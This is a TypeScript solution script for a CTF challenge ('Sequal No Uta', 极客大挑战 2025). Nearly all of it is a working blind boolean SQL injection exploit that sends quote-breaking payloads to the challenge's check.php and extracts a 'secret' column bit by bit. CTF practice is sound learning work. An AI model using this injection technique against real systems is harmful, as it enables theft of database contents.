import ky from "ky";
import exploiter from "../lib/exploiter";

const exp = new exploiter({
	checker: async (payload) => {
		const res = await ky
			.get(
				"http://019ae421-641d-7df3-b683-28482d5bbdfd.geek.ctfplus.cn/check.php",
				{
					searchParams: {
						name: payload,
					},
				},
			)
			.catch((_) => void 0);
		if (!res) return false;
		return (await res.text()).includes("该用户存在且活跃");
	},
	builder: (payload) => `-1'or(${payload})--`,
	patterns: {
		bitGT: (target: unknown, bit: unknown, mid: number) =>
			`substr((${target}),${bit},1)>'${String.fromCharCode(mid)}'`,
	},
});

await exp.runSqli("select(group_concat(secret))from(users)");

// solution to 极客大挑战 2025 Sequal No Uta
